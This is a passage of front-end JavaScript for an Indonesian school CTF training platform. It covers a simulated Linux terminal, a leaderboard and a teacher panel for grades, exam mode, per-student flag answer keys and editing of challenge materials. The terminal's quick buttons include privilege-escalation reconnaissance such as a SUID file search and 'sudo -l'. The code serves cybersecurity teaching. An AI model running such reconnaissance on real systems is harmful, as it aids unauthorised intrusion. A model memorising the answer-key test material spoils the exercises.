        <span class="meta-tag" style="background:var(--layar-tabung);color:var(--fosfor)">VT100 EMULATOR</span>
      </div>

      <!-- Bilah Makro Cepat -->
      <div class="quick-command-bar" style="margin:20px 0 14px">
        <span class="quick-command-label">PERINTAH INVESTIGASI CEPAT:</span>
        <div class="quick-command-pills">
          <button class="cmd-pill" data-cmd="pwd">pwd</button>
          <button class="cmd-pill" data-cmd="ls -la">ls -la</button>
          <button class="cmd-pill" data-cmd="cat config.txt">cat config.txt</button>
          <button class="cmd-pill" data-cmd="find / -perm -u=s -type f 2>/dev/null">find SUID</button>
          <button class="cmd-pill" data-cmd="curl -i http://api.toko.lab/profile">curl profile</button>
          <button class="cmd-pill" data-cmd="cat knock.log">cat knock.log</button>
          <button class="cmd-pill" data-cmd="cat cipher.hex">cat cipher.hex</button>
          <button class="cmd-pill" data-cmd="cat update.sh">cat update.sh</button>
          <button class="cmd-pill" data-cmd="cat uart_config.txt">cat uart_config.txt</button>
          <button class="cmd-pill" data-cmd="sudo -l">sudo -l</button>
          <button class="cmd-pill" data-cmd="cat leak.txt">cat leak.txt</button>
          <button class="cmd-pill" data-cmd="clear">clear</button>
        </div>
      </div>

      <!-- Layar CRT Terminal -->
      <div class="crt-terminal-frame">
        <div class="crt-terminal-topbar">
          <span>SESI: student@cyberlab:~$ • TTY1</span>
          <span>EMULASI KERNEL LINUX</span>
        </div>
        <div class="terminal-scroll-area" id="mainTermScroll" style="min-height:360px">
          <div id="mainTermHistory">CyberLab Linux Terminal Simulator v2.4\nKetik 'help' untuk daftar perintah simulasi.\n\n</div>
        </div>
        <div class="terminal-input-row">
          <span>pemain@lab:~$ </span>
          <input class="terminal-input-field" id="mainTermInput" spellcheck="false" autofocus aria-label="Terminal prompt">
        </div>
      </div>
    </div>
  `;

  initTerminal('mainTermScroll','mainTermHistory','mainTermInput');
}

/* ================= 6. ROSTER BUKU BESAR ================= */
async function peringkat(){
  app.innerHTML=`
    <div class="dossier-card dossier-card-white" style="border:2px solid var(--tinta-pekat)">
      <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px">
        <div>
          <span class="meta-tag">LEDGER BUKU BESAR // REKAMAN SKOR</span>
          <h2 style="font-family:var(--font-judul);font-size:26px;margin:8px 0">Roster Reputasi Penyelidik</h2>
          <p style="margin:0;font-size:13px;color:var(--pensil)">
            Daftar peringkat resmi berdasarkan perolehan bounty XP dan akumulasi kasus terpecahkan di server lokal.
          </p>
        </div>
        <span class="stamp-classified" style="border-color:#2F7F20;color:#2F7F20">DIVERIFIKASI</span>
      </div>

      <div id="rosterTableSlot" style="margin-top:20px">
        <div style="font-family:var(--font-kode);font-size:12px;color:var(--pensil)">Memuat catatan buku besar...</div>
      </div>
    </div>
  `;

  try{
    const j=await api('/api/leaderboard');
    if(!j.leaders||!j.leaders.length){
      $('#rosterTableSlot').innerHTML='<p style="color:var(--pensil);font-family:var(--font-kode);padding:14px 0">Belum ada penyelidik yang terdaftar di buku besar.</p>';
      return;
    }

    $('#rosterTableSlot').innerHTML=`
      <table class="ledger-roster-table">
        <thead>
          <tr>
            <th style="width:70px">POS.</th>
            <th>IDENTITAS OPERATOR</th>
            <th>KELAS</th>
            <th style="width:160px">KASUS SELESAI</th>
            <th style="width:140px;text-align:right">BOUNTY REPUTASI</th>
          </tr>
        </thead>
        <tbody>
          ${j.leaders.map((x,i)=>`
            <tr>
              <td>
                ${i<3?`<span class="rank-circled">${i+1}</span>`:`<span style="color:var(--pensil);font-family:var(--font-kode)">${String(i+1).padStart(2,'0')}</span>`}
              </td>
              <td><strong>${escapeHTML(x.name)}</strong></td>
              <td>${escapeHTML(x.kelas||'TJKT')}</td>
              <td>${x.solved} / ${challenges.length||15} kasus</td>
              <td style="text-align:right;font-weight:700;color:var(--merah-stempel)">${x.score} XP</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
      
      <div class="marginalia-note" style="margin-top:22px;font-size:18px">
        ✎ Catatan Guru: "Papan skor hanyalah catatan angka. Yang membedakan teknisi sejati adalah ketekunan menelusuri akar masalah."
      </div>
    `;
  }catch(err){
    $('#rosterTableSlot').textContent='Gagal memuat catatan buku besar: '+err.message;
  }
}

/* ================= 7. PANEL GURU & ADMIN (LENGKAP) ================= */
async function admin(){
  if(!adminToken){
    view='superadminLogin';
    render();
    return;
  }

  const adminTab=$('#binderTabAdmin');
  if(adminTab) adminTab.style.display='inline-flex';

  app.innerHTML=`
    <div class="dossier-card dossier-card-white" style="border:2px solid var(--tinta-pekat)">
      <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px;margin-bottom:18px">
        <div>
          <span class="dossier-stamp-top">ADMINISTRATOR</span>
          <span class="case-file-tab">PORTAL PENGELOLAAN GURU // MATA PELAJARAN TJKT</span>
          <h2 style="font-family:var(--font-judul);font-size:28px;margin:8px 0">Panel Penilaian Siswa & Pengaturan Ujian</h2>
        </div>
        <div style="display:flex;gap:8px">
          <button class="btn-secondary-action" id="btnOpenChangePassword" style="font-size:11px">🔐 Ganti Sandi Admin</button>
          <button class="btn-secondary-action" id="btnAdminLogout" style="font-size:11px">Keluar Sesi Guru</button>
        </div>
      </div>

      <!-- Bilah Sub-Navigasi Admin -->
      <div class="admin-subnav">
        <button class="admin-subtab ${adminSubView==='grades'?'active':''}" data-sub="grades">📊 Rapor & Diagnostik Siswa</button>
        <button class="admin-subtab ${adminSubView==='exam'?'active':''}" data-sub="exam">🛡️ Mode Ujian, Timer & Skor</button>
        <button class="admin-subtab ${adminSubView==='materials'?'active':''}" data-sub="materials">📚 Kelola & Edit Materi</button>
        <button class="admin-subtab ${adminSubView==='curriculum'?'active':''}" data-sub="curriculum">🎯 Kelola Silabus & Tujuan</button>
        <button class="admin-subtab ${adminSubView==='accounts'?'active':''}" data-sub="accounts">👥 Generate & Import CSV Akun</button>
        <button class="admin-subtab ${adminSubView==='alerts'?'active':''}" data-sub="alerts">🚨 Peringatan Login Ganda</button>
        <button class="admin-subtab ${adminSubView==='supabase'?'active':''}" data-sub="supabase">⚡ Koneksi Supabase & Sync</button>
      </div>

      <div id="adminContentSlot">Memuat data panel guru...</div>
    </div>
  `;

  $('#btnAdminLogout').onclick=performLogout;

  if($('#btnOpenChangePassword')){
    $('#btnOpenChangePassword').onclick=()=>{
      $('#changePasswordDialog').showModal();
    };
  }

  document.querySelectorAll('[data-sub]').forEach(b=>{
    b.onclick=()=>{
      adminSubView=b.dataset.sub;
      admin();
    };
  });

  if(adminSubView==='grades') renderAdminGrades();
  if(adminSubView==='exam') renderAdminExam();
  if(adminSubView==='materials') renderAdminMaterials();
  if(adminSubView==='curriculum') renderAdminCurriculum();
  if(adminSubView==='addCase') renderAdminAddCase();
  if(adminSubView==='accounts') renderAdminAccounts();
  if(adminSubView==='alerts') renderAdminAlerts();
  if(adminSubView==='supabase') renderAdminSupabase();
}

/* SUB 1: LAPORAN PENILAIAN SISWA & KONVERSI NILAI */
async function renderAdminGrades(){
  const slot=$('#adminContentSlot');
  try{
    const j=await api('/api/admin/analytics');
    const list=j.analytics||[];

    slot.innerHTML=`
      <!-- Ringkasan Statistik Penilaian -->
      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px">
        <div class="dossier-card" style="padding:16px">
          <span style="font-family:var(--font-kode);font-size:10px;color:var(--pensil)">TOTAL SISWA TERDAFTAR</span>
          <strong style="display:block;font-size:26px;margin:4px 0">${j.totalStudents} Siswa</strong>
          <span class="meta-tag">DATABASE LOKAL / SUPABASE</span>
        </div>
        <div class="dossier-card" style="padding:16px">
          <span style="font-family:var(--font-kode);font-size:10px;color:var(--pensil)">RATA-RATA NILAI RAPOR</span>
          <strong style="display:block;font-size:26px;color:var(--merah-stempel);margin:4px 0">
            ${list.length?Math.round(list.reduce((acc,x)=>acc+x.finalGrade,0)/list.length):0} / 100
          </strong>
          <span class="meta-tag">SKALA KURIKULUM MERDEKA</span>
        </div>
        <div class="dossier-card" style="padding:16px">
          <span style="font-family:var(--font-kode);font-size:10px;color:var(--pensil)">TOTAL KASUS TANTANGAN</span>
          <strong style="display:block;font-size:26px;margin:4px 0">${j.totalChallenges} Kasus (${j.totalXP} XP)</strong>
          <span class="meta-tag">LOW • MED • HIGH</span>
        </div>
      </div>

      <!-- Toolbar Aksi Ekspor -->
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:10px">
        <h3 style="font-family:var(--font-judul);font-size:18px;margin:0">Laporan Capaian Kompetensi Siswa (Diagnostik TJKT)</h3>
        <div style="display:flex;gap:8px">
          <button class="btn-secondary-action" id="btnExportGradesCSV" style="font-size:11px">📥 Unduh Rekap CSV</button>
          <button class="btn-secondary-action" id="btnPrintGrades" style="font-size:11px">🖨️ Cetak Lembar Rapor</button>
        </div>
      </div>

      <!-- Tabel Lengkap Penilaian & Diagnostik -->
      <div style="overflow-x:auto">
        <table class="ledger-roster-table" style="font-size:12px" id="gradesTableElement">
          <thead>
            <tr style="background:var(--kertas-karton)">
              <th style="width:40px">NO</th>
              <th>NAMA SISWA</th>
              <th>KELAS</th>
              <th style="min-width:140px">KOMPETENSI LINUX</th>
              <th style="min-width:140px">KOMPETENSI JARINGAN</th>
              <th style="min-width:140px">KOMPETENSI CYBER/WEB</th>
              <th style="width:90px;text-align:center">NILAI (0-100)</th>
              <th style="width:110px">PREDIKAT</th>
              <th style="min-width:220px">CATATAN GURU (DIAGNOSTIK)</th>
            </tr>
          </thead>
          <tbody>
            ${list.length?list.map((s,i)=>`
              <tr>
                <td>${i+1}</td>
                <td><strong>${escapeHTML(s.name)}</strong><br><small style="color:var(--pensil)">NISN: ${escapeHTML(s.nisn)}</small></td>
                <td>${escapeHTML(s.kelas)}</td>
                <td>
                  <div class="competency-mini-bar">
                    <div class="competency-bar-track">
                      <div class="competency-bar-fill" style="width:${s.competencies.linux.pct}%"></div>
                    </div>
                    <span>${s.competencies.linux.pct}%</span>
                  </div>
                  <small style="color:var(--pensil)">${s.competencies.linux.solved}/${s.competencies.linux.total} tuntas</small>
                </td>
                <td>
                  <div class="competency-mini-bar">
                    <div class="competency-bar-track">
                      <div class="competency-bar-fill net" style="width:${s.competencies.network.pct}%"></div>
                    </div>
                    <span>${s.competencies.network.pct}%</span>
                  </div>
                  <small style="color:var(--pensil)">${s.competencies.network.solved}/${s.competencies.network.total} tuntas</small>
                </td>
                <td>
                  <div class="competency-mini-bar">
                    <div class="competency-bar-track">
                      <div class="competency-bar-fill cyber" style="width:${s.competencies.cyber.pct}%"></div>
                    </div>
                    <span>${s.competencies.cyber.pct}%</span>
                  </div>
                  <small style="color:var(--pensil)">${s.competencies.cyber.solved}/${s.competencies.cyber.total} tuntas</small>
                </td>
                <td style="text-align:center;font-size:16px;font-weight:900;color:var(--merah-stempel)">${s.finalGrade}</td>
                <td>
                  <span class="grade-badge ${s.finalGrade>=88?'a':s.finalGrade>=75?'b':s.finalGrade>=60?'c':'d'}">
                    ${escapeHTML(s.predicate)}
                  </span>
                </td>
                <td style="font-size:11px;color:var(--tinta-tubuh);line-height:1.4">
                  <div id="noteDisplay_${i}" style="margin-bottom:6px">
                    ${s.customTeacherNote ? `<strong style="color:#B45309">✎ Catatan Guru:</strong> ` : ''}${escapeHTML(s.teacherNote)}
                  </div>
                  <button class="btn-secondary-action btn-toggle-note" data-idx="${i}" style="font-size:10px;padding:2px 6px">✏️ Tulis / Edit Catatan</button>
                  <div id="noteEditor_${i}" style="display:none;margin-top:6px">
                    <textarea id="noteInput_${i}" style="width:100%;font-size:11px;padding:6px;border:1px solid #D97706;border-radius:3px;background:#FFFBEB;font-family:var(--font-kode)" rows="3" placeholder="Tuliskan catatan perbaikan materi untuk ${escapeHTML(s.name)}...">${escapeHTML(s.customTeacherNote || '')}</textarea>
                    <div style="display:flex;gap:4px;margin-top:4px">
                      <button class="btn-save-note" data-idx="${i}" data-name="${escapeHTML(s.name)}">Simpan Catatan</button>
                      <button class="btn-secondary-action btn-cancel-note" data-idx="${i}" style="font-size:10px;padding:2px 6px">Batal</button>
                    </div>
                  </div>
                </td>
              </tr>
            `).join(''):`<tr><td colspan="9" style="text-align:center;padding:20px">Belum ada data siswa terdaftar.</td></tr>`}
          </tbody>
        </table>
      </div>
    `;

    document.querySelectorAll('.btn-toggle-note').forEach(b=>{
      b.onclick=()=>{
        const idx=b.dataset.idx;
        $(`#noteEditor_${idx}`).style.display='block';
        b.style.display='none';
      };
    });

    document.querySelectorAll('.btn-cancel-note').forEach(b=>{
      b.onclick=()=>{
        const idx=b.dataset.idx;
        $(`#noteEditor_${idx}`).style.display='none';
        document.querySelector(`.btn-toggle-note[data-idx="${idx}"]`).style.display='inline-block';
      };
    });

    document.querySelectorAll('.btn-save-note').forEach(b=>{
      b.onclick=async()=>{
        const idx=b.dataset.idx;
        const sName=b.dataset.name;
        const noteVal=$(`#noteInput_${idx}`).value.trim();
        b.disabled=true;
        b.textContent='Menyimpan...';
        try{
          await api('/api/admin/student/notes','POST',{studentName:sName,note:noteVal});
          $(`#noteDisplay_${idx}`).innerHTML=(noteVal ? `<strong style="color:#B45309">✎ Catatan Guru:</strong> ` : '') + escapeHTML(noteVal || 'Catatan berhasil diperbarui.');
          $(`#noteEditor_${idx}`).style.display='none';
          document.querySelector(`.btn-toggle-note[data-idx="${idx}"]`).style.display='inline-block';
        }catch(e){
          alert('Gagal menyimpan catatan: '+e.message);
        }finally{
          b.disabled=false;
          b.textContent='Simpan Catatan';
        }
      };
    });

    $('#btnExportGradesCSV').onclick=()=>{
      let csvContent="No,Nama Siswa,NISN,Kelas,Nilai Akhir,Predikat,Kompetensi Linux (%),Kompetensi Jaringan (%),Kompetensi Cyber (%),Catatan Diagnostik Guru\n";
      list.forEach((s,idx)=>{
        csvContent+=`${idx+1},"${s.name}","${s.nisn}","${s.kelas}",${s.finalGrade},"${s.predicate}",${s.competencies.linux.pct}%,${s.competencies.network.pct}%,${s.competencies.cyber.pct}%,"${s.teacherNote.replace(/"/g,'""')}"\n`;
      });
      const blob=new Blob([csvContent],{type:'text/csv;charset=utf-8;'});
      const link=document.createElement('a');
      link.href=URL.createObjectURL(blob);
      link.download=`Rekap_Nilai_TJKT_CTF_${new Date().toISOString().slice(0,10)}.csv`;
      link.click();
    };

    $('#btnPrintGrades').onclick=()=>{
      window.print();
    };

  }catch(err){
    slot.innerHTML=`<div class="flag-feedback-msg danger">Gagal memuat analitik: ${err.message}</div>`;
  }
}

/* SUB 2: MODE UJIAN & FLAG DINAMIS (ANTI KECURANGAN) */
async function renderAdminExam(){
  const slot=$('#adminContentSlot');
  try{
    const cfgRes=await api('/api/admin/exam-config');
    const keysRes=await api('/api/admin/exam-keys');
    const examCfg=cfgRes.examConfig||{examMode:false,strictDynamic:false,timerMinutes:60,dynamicScoring:true,maxBonusSolvers:5};
    const studentKeys=keysRes.studentKeys||[];

    const isTimerRunning = examCfg.examEndTime && (examCfg.examEndTime > Date.now());
    const remainingMins = isTimerRunning ? Math.ceil((examCfg.examEndTime - Date.now()) / 60000) : 0;

    slot.innerHTML=`
      <!-- Banner Mode Ujian -->
      <div class="exam-mode-banner">
        <div>
          <h3 style="font-family:var(--font-judul);font-size:20px;margin:0 0 4px;color:#92400E">
            🛡️ Pengaturan Mode Ujian & Flag Dinamis Unik (Anti-Kecurangan)
          </h3>
          <p style="margin:0;font-size:13px;color:var(--tinta-tubuh);max-width:700px">
            Saat Mode Ujian diaktifkan, setiap siswa yang mengerjakan tantangan CTF akan mendapatkan <strong>flag rahasia yang berbeda secara matematis</strong> (berdasarkan hash nama siswa + ID soal + garam kriptografis). Siswa tidak bisa menyalin jawaban temannya!
          </p>
        </div>
        <div class="exam-toggle-wrap">
          <span style="font-family:var(--font-kode);font-weight:700;font-size:12px">${examCfg.examMode?'UJIAN AKTIF':'MODE BELAJAR'}</span>
          <label class="switch-toggle">
            <input type="checkbox" id="chkExamMode" ${examCfg.examMode?'checked':''}>
            <span class="slider-toggle"></span>
          </label>
        </div>
      </div>

      <!-- Kartu Pengaturan Timer Ujian & Pengerjaan Soal -->
      <div class="dossier-card dossier-card-white" style="margin-bottom:20px;border-left:4px solid #DC2626">
        <h4 style="font-family:var(--font-judul);font-size:16px;margin:0 0 8px;display:flex;align-items:center;gap:8px">
          ⏳ Fitur Timer Pengerjaan Ujian (Batas Waktu Otomatis)
        </h4>
        <p style="font-size:12px;color:var(--pensil);margin:0 0 14px">
          Atur batas durasi pengerjaan ujian. Jika waktu habis, sistem otomatis mengunci form pengiriman flag siswa dan menandai sesi ujian telah selesai.
        </p>

        <div style="display:flex;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:14px">
          <div style="display:flex;align-items:center;gap:8px">
            <label style="font-family:var(--font-kode);font-size:12px;font-weight:700">DURASI UJIAN:</label>
            <input type="number" id="inputTimerMinutes" value="${examCfg.timerMinutes || 60}" min="5" max="360" style="width:80px;padding:6px;border:1.5px solid var(--tinta-pekat);border-radius:var(--radius);font-family:var(--font-kode)">
            <span style="font-size:12px;font-weight:700">Menit</span>
          </div>

          <div style="display:flex;gap:8px">
            <button class="btn-primary-action" id="btnStartTimer" style="font-size:11px;padding:8px 14px;background:#B91C1C">
              ${isTimerRunning ? '🔄 Perpanjang / Reset Timer' : '▶️ Mulai Countdown Timer Ujian'}
            </button>
            ${isTimerRunning ? `
              <button class="btn-secondary-action" id="btnStopTimer" style="font-size:11px;padding:8px 14px">
                ⏹️ Hentikan Timer
              </button>
            ` : ''}
          </div>

          <div style="margin-left:auto;font-family:var(--font-kode);font-size:12px">
            STATUS: ${isTimerRunning ? `<strong style="color:#DC2626">⏳ BERJALAN (Sisa: ±${remainingMins} menit)</strong>` : '<span style="color:var(--pensil)">Timer Mati</span>'}
          </div>
        </div>

        <label style="display:flex;align-items:center;gap:10px;cursor:pointer;font-family:var(--font-kode);font-size:12px">
          <input type="checkbox" id="chkStrictDynamic" ${examCfg.strictDynamic?'checked':''}>
          <strong>Terapkan Flag Unik Ketat (Strict):</strong> Hanya menerima flag dinamis siswa, tolak flag statis umum.
        </label>
      </div>

      <!-- Kartu Pengaturan Skor Dinamis (First Blood & Kecepatan) -->
      <div class="dossier-card dossier-card-white" style="margin-bottom:24px;border-left:4px solid #D97706">
        <h4 style="font-family:var(--font-judul);font-size:16px;margin:0 0 8px;display:flex;align-items:center;gap:8px">
          ⚡ Pengaturan Skor Dinamis (First Blood & Penjawab Tercepat)
        </h4>
        <p style="font-size:12px;color:var(--pensil);margin:0 0 14px">
          Memberikan penghargaan bagi siswa yang menjawab lebih cepat. Siswa tercepat mendapatkan bonus poin tertinggi, semakin terakhir menjawab skor berkurang secara adil.
        </p>

        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin-bottom:14px">
          <label style="display:flex;align-items:center;gap:10px;cursor:pointer;font-family:var(--font-kode);font-size:12px">
            <input type="checkbox" id="chkDynamicScoring" ${examCfg.dynamicScoring !== false ? 'checked' : ''}>
            <strong>Aktifkan Skor Dinamis Kecepatan</strong>
          </label>

          <div style="display:flex;align-items:center;gap:8px">
            <label style="font-family:var(--font-kode);font-size:12px">Jumlah Penjawab Bonus:</label>
            <input type="number" id="inputMaxBonusSolvers" value="${examCfg.maxBonusSolvers || 5}" min="1" max="10" style="width:60px;padding:6px;border:1.5px solid var(--tinta-pekat);border-radius:var(--radius);font-family:var(--font-kode)">
            <span style="font-size:12px">orang pertama</span>
          </div>
        </div>

        <div style="font-size:11px;color:var(--pensil);line-height:1.5;background:#FFFBEB;padding:10px;border-radius:var(--radius);border:1px dashed #D97706">
          <strong>Skema Bonus Kecepatan:</strong><br>
          • Penjawab #1 (🩸 First Blood): Poin Penuh + 30 XP Bonus Kecepatan<br>
          • Penjawab #2: Poin Penuh + 20 XP Bonus<br>
          • Penjawab #3: Poin Penuh + 15 XP Bonus<br>
          • Penjawab #4: Poin Penuh + 10 XP Bonus<br>
          • Penjawab #5: Poin Penuh + 5 XP Bonus<br>
          • Penjawab #6 dst: Poin dasar normal
        </div>

        <div style="margin-top:16px">
          <button class="btn-primary-action" id="btnSaveExamConfig" style="font-size:12px">
            Simpan Seluruh Pengaturan Ujian
          </button>
          <span id="examSaveMsg" style="margin-left:10px;font-family:var(--font-kode);font-size:11px"></span>
        </div>
      </div>

      <h3 style="font-family:var(--font-judul);font-size:18px;margin:24px 0 10px">Kunci Jawaban Flag Ujian per Siswa (Pegangan Guru)</h3>
      <div style="overflow-x:auto">
        <table class="ledger-roster-table" style="font-size:11px">
          <thead>
            <tr style="background:var(--kertas-karton)">
              <th style="width:40px">NO</th>
              <th>NAMA SISWA</th>
              <th>KELAS</th>
              <th>KUNCI FLAG KASUS #001</th>
              <th>KUNCI FLAG KASUS #002</th>
              <th>KUNCI FLAG KASUS #003</th>
              <th>KUNCI FLAG KASUS #012 (UART)</th>
            </tr>
          </thead>
          <tbody>
            ${studentKeys.length?studentKeys.map((s,i)=>{
              const f1=s.flags.find(f=>f.id===1)?.flag||'-';
              const f2=s.flags.find(f=>f.id===2)?.flag||'-';
              const f3=s.flags.find(f=>f.id===3)?.flag||'-';
              const f12=s.flags.find(f=>f.id===12)?.flag||'-';
              return `
                <tr>
                  <td>${i+1}</td>
                  <td><strong>${escapeHTML(s.name)}</strong></td>
                  <td>${escapeHTML(s.kelas)}</td>
                  <td><code>${f1}</code></td>
                  <td><code>${f2}</code></td>
                  <td><code>${f3}</code></td>
                  <td><code>${f12}</code></td>
                </tr>
              `;
            }).join(''):`<tr><td colspan="7" style="text-align:center;padding:16px">Belum ada siswa terdaftar.</td></tr>`}
          </tbody>
        </table>
      </div>
    `;

    $('#btnSaveExamConfig').onclick=async()=>{
      try{
        const isExam=$('#chkExamMode').checked;
        const isStrict=$('#chkStrictDynamic').checked;
        const isDynScoring=$('#chkDynamicScoring').checked;
        const maxBonus=Number($('#inputMaxBonusSolvers').value)||5;
        const timerMins=Number($('#inputTimerMinutes').value)||60;

        await api('/api/admin/exam-config','POST',{
          examMode:isExam,
          strictDynamic:isStrict,
          dynamicScoring:isDynScoring,
          maxBonusSolvers:maxBonus,
          timerMinutes:timerMins
        });
        $('#examSaveMsg').textContent='✓ Pengaturan ujian berhasil disimpan!';
        $('#examSaveMsg').style.color='#166534';
        await refresh();
      }catch(e){
        $('#examSaveMsg').textContent=e.message;
        $('#examSaveMsg').style.color='var(--merah-stempel)';
      }
    };

    $('#btnStartTimer').onclick=async()=>{
      try{
        const timerMins=Number($('#inputTimerMinutes').value)||60;
        await api('/api/admin/exam-config','POST',{
          examMode: true,
          action: 'start_timer',
          timerMinutes: timerMins
        });
        alert(`Countdown timer ujian sebesar ${timerMins} menit berhasil dimulai!`);
        renderAdminExam();
      }catch(e){
        alert('Gagal memulai timer: '+e.message);
      }
    };

    if($('#btnStopTimer')){
      $('#btnStopTimer').onclick=async()=>{
        try{
          await api('/api/admin/exam-config','POST',{
            action: 'stop_timer'
          });
          alert('Timer ujian dihentikan.');
          renderAdminExam();
        }catch(e){
          alert('Gagal menghentikan timer: '+e.message);
        }
      };
    }

  }catch(err){
    slot.innerHTML=`<div class="flag-feedback-msg danger">Gagal memuat mode ujian: ${err.message}</div>`;
  }
}

/* SUB 3: KELOLA & EDIT MATERI / SOAL (DATABASE MANAGEMENT) */
async function renderAdminMaterials(){
  const slot=$('#adminContentSlot');
  slot.innerHTML='Memuat daftar materi dari database...';
  try{
    const j=await api('/api/admin/materials');
    const materials=j.materials||[];
    challenges=materials; // Selalu sinkronkan variabel global challenges ke seluruh halaman publik dan siswa!

    slot.innerHTML=`
      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:18px">
        <div>
          <h3 style="font-family:var(--font-judul);font-size:20px;margin:0 0 4px">Daftar Materi & Kasus CTF di Database</h3>
          <p style="font-size:12px;color:var(--pensil);margin:0">Semua materi tersimpan di database dan dapat diperbarui sewaktu-waktu oleh Guru.</p>
        </div>
        <div style="display:flex;gap:8px">
          <button class="btn-primary-action" id="btnAdminAddNewMaterial" style="font-size:11px">➕ Buat Materi Baru</button>
          <button class="btn-secondary-action" id="btnAdminResetMaterials" style="font-size:11px">🔄 Reset ke 60 Kasus Standar</button>
        </div>
      </div>

      <!-- Modal / Form Editor Materi (Awalnya tersembunyi) -->
      <div id="materialEditorCard" class="dossier-card dossier-card-white" style="display:none;margin-bottom:24px;border:2px solid var(--merah-stempel)">
        <h4 id="editorTitle" style="font-family:var(--font-judul);font-size:18px;margin:0 0 14px">Edit Materi Kasus</h4>
        <form id="formSaveMaterial">
          <input type="hidden" id="editMatId">

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
            <div class="admin-form-group">
              <label>JUDUL MATERI / KASUS:</label>
              <input id="editMatTitle" required>
            </div>
            <div class="admin-form-group">
              <label>KATEGORI:</label>
              <select id="editMatCategory">
                <option value="Linux">Linux (Administrasi Server)</option>
                <option value="Jaringan">Jaringan (Protokol & Firewall)</option>
                <option value="Cyber">Cyber (Web & Kripto)</option>
                <option value="Hardware">Hardware (IoT & Serial)</option>
              </select>
            </div>
          </div>

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
            <div class="admin-form-group">
              <label>TINGKAT KESULITAN:</label>
              <select id="editMatDifficulty">
                <option value="Dasar (Low)">Dasar (Low)</option>
                <option value="Sedang (Medium)">Sedang (Medium)</option>
                <option value="Sulit (High)">Sulit (High)</option>
              </select>
            </div>
            <div class="admin-form-group">
              <label>POIN XP:</label>
              <input id="editMatPoints" type="number" min="50" max="1000" required>
            </div>
          </div>

          <div class="admin-form-group">
            <label>PENJELASAN TEORI MATERI (LESSON):</label>
            <textarea id="editMatLesson" rows="4" required></textarea>
          </div>

          <div class="admin-form-group">
            <label>NASKAH NARASI AUDIO GURU (AUDIO TEXT):</label>
            <textarea id="editMatAudio" rows="2" placeholder="Teks yang akan dibacakan oleh narator suara..."></textarea>
          </div>

          <div class="admin-form-group">
            <label>PERTANYAAN TUGAS KASUS (TASK):</label>
            <input id="editMatTask" required>
          </div>

          <div class="admin-form-group">
            <label>KUNCI JAWABAN / FLAG RESMI (Pisahkan koma jika ada alternatif):</label>
            <input id="editMatAnswers" required>
          </div>

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
            <div class="admin-form-group">
              <label>PETUNJUK (HINT):</label>
              <input id="editMatHint">
            </div>
            <div class="admin-form-group">
              <label>PENJELASAN SOLUSI SAAT TUNTAS (EXPLAIN):</label>
              <input id="editMatExplain">
            </div>
          </div>

          <div style="display:flex;gap:10px;margin-top:14px">
            <button type="submit" class="btn-primary-action">💾 Simpan Perubahan ke Database</button>
            <button type="button" class="btn-secondary-action" id="btnCancelEditMat">Batal</button>
          </div>
        </form>
      </div>

      <!-- Filter & Pencarian Materi -->
      <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
        <input type="text" id="searchMaterialInput" placeholder="🔍 Cari judul materi atau tugas..." style="flex:1;min-width:200px;padding:8px 12px;border:1.5px solid var(--tinta-pekat);border-radius:var(--radius);font-family:var(--font-kode);font-size:12px">
        <select id="filterCategorySelect" style="padding:8px;border:1.5px solid var(--tinta-pekat);border-radius:var(--radius);font-family:var(--font-kode);font-size:12px">
          <option value="ALL">Semua Kategori</option>
          <option value="Linux">Linux</option>
          <option value="Jaringan">Jaringan</option>
          <option value="Cyber">Cyber</option>
          <option value="Hardware">Hardware</option>
        </select>
      </div>

      <!-- Daftar Card Materi -->
      <div id="materialsListSlot"></div>
    `;

    function renderMaterialsList(items){
      const listSlot=$('#materialsListSlot');
      if(!items.length){
        listSlot.innerHTML='<div style="padding:20px;text-align:center;color:var(--pensil);background:#fff;border:1.5px dashed var(--tinta-pekat);border-radius:var(--radius)">Tidak ada materi yang sesuai dengan pencarian.</div>';
        return;
      }
      listSlot.innerHTML=items.map(m=>`
        <div class="material-item-card">
          <div class="material-item-info">
            <h4>#${m.id}. ${escapeHTML(m.title)}</h4>
            <p>
              <span class="meta-tag">${escapeHTML(m.category)}</span>
              <span class="meta-tag">${escapeHTML(m.difficulty)}</span>
              <span class="meta-tag" style="background:#FEF3C7;color:#92400E;font-weight:700">${m.points} XP</span>
            </p>
            <p style="margin-top:6px;color:var(--tinta-tubuh);font-size:12px">
              <strong>Tugas:</strong> ${escapeHTML(m.task)}
            </p>
          </div>
          <div style="display:flex;gap:6px">
            <button class="btn-primary-action btn-edit-mat" data-id="${m.id}" style="font-size:11px;padding:6px 12px">✏️ Edit Materi</button>
            <button class="btn-secondary-action btn-del-mat" data-id="${m.id}" style="font-size:11px;padding:6px 12px;color:var(--merah-stempel)">🗑️ Hapus</button>
          </div>
        </div>
      `).join('');

      listSlot.querySelectorAll('.btn-edit-mat').forEach(b=>{
        b.onclick=()=>{
          const mId=Number(b.dataset.id);
          const m=materials.find(x=>x.id===mId);
          if(!m) return;
          $('#editMatId').value=m.id;
          $('#editMatTitle').value=m.title||'';
          $('#editMatCategory').value=m.category||'Linux';
          $('#editMatDifficulty').value=m.difficulty||'Dasar (Low)';
          $('#editMatPoints').value=m.points||100;
          $('#editMatLesson').value=m.lesson||'';
          $('#editMatAudio').value=m.audioText||'';
          $('#editMatTask').value=m.task||'';
          $('#editMatAnswers').value=Array.isArray(m.answers)?m.answers.join(', '):(m.answers||'');
          $('#editMatHint').value=m.hint||'';
          $('#editMatExplain').value=m.explain||'';
          $('#editorTitle').textContent=`Edit Materi #${m.id}: ${m.title}`;
          $('#materialEditorCard').style.display='block';
          $('#materialEditorCard').scrollIntoView({behavior:'smooth'});
        };
      });

      listSlot.querySelectorAll('.btn-del-mat').forEach(b=>{
        b.onclick=async()=>{
          const mId=Number(b.dataset.id);
